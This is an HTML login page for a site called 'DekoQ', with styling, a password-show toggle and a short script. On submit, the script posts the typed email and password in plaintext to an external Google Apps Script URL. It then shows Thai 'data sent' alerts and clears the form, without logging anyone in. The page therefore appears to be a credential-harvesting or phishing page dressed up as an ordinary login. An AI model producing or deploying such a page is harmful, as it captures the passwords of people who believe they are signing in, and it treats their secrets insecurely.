<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }

    .container h1 {
      font-size: 3rem;
      margin: 0;
    }

    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
    }

    input[type="email"],
    .password-container,
    button {
      width: 100%;
      font-size: 1rem;
      border-radius: 8px;
    }

    input[type="email"] {
      padding: 0.8rem 1.2rem;
      margin-bottom: 1.2rem;
      border: 1px solid #ccc;
      text-align: left;
    }

    .password-container {
      position: relative;
      margin-bottom: 1.2rem;
    }

    .password-container input[type="password"],
    .password-container input[type="text"] {
      width: 100%;
      padding: 0.8rem 2.5rem 0.8rem 1.2rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      text-align: left;
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
    }

    .toggle-password svg {
      width: 20px;
      height: 20px;
    }

    button {
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #000;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <input type="email" id="email" name="email" required placeholder="Value" />

        <label for="password">Password</label>
        <div class="password-container">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <button type="button" class="toggle-password" onclick="togglePassword()">
            <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
            </svg>
          </button>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.querySelector("#form");
    const passwordInput = document.querySelector("#password");
    const eyeIcon = document.querySelector("#eye-icon");
    let passwordVisible = false;

    function togglePassword() {
      passwordVisible = !passwordVisible;
      passwordInput.type = passwordVisible ? "text" : "password";
    }

    const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
        .then(response => {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        })
        .catch(error => {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
          console.error("Error!", error.message);
        });
    });
  </script>
</body>
</html>
